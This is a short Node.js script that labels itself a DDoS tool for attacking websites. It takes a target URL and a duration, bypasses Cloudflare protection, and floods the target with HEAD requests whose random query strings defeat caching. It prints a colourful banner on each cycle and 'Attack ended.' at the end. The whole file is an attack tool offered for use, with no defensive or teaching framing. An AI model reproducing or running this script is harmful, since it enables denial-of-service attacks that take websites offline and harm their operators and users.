require('events').EventEmitter.defaultMaxListeners = 0;
const CloudflareBypasser = require('cloudflare-bypasser');
const cryptoRandomString = require('crypto-random-string');
const path = require('path');
var colors = require('colors');

let cf = new CloudflareBypasser();

if (process.argv.length !== 4) {
    console.log(``);
    process.exit(0);
}

const target = process.argv[2],
    time = process.argv[3];

function send_req() {
	for (let i = 0; i < 1; ++i) {
		cf.request({
			method: 'HEAD',
			uri: target + '/?s=' + cryptoRandomString({length: 32}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 32}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 32}),
		}).then(res => {
		});
}
}

setInterval(() => {
    send_req();
	send_req();
	send_req();
	send_req();
	send_req();
	send_req();
	send_req();
	send_req();
	send_req();
	send_req();
Array.prototype.random = function (length) {return this[Math.floor((Math.random()*length))];}
var color = ['yellow', 'cyan', 'magenta', 'red', 'green', 'blue', 'rainbow']
var rcolor = color.random(color.length)
console.log(("DDoS Script Websites by Z3NTL3 Root AND Efdal")[rcolor]);
});

setTimeout(() => {
    console.log('Attack ended.');
    process.exit(0)
}, time * 1000);
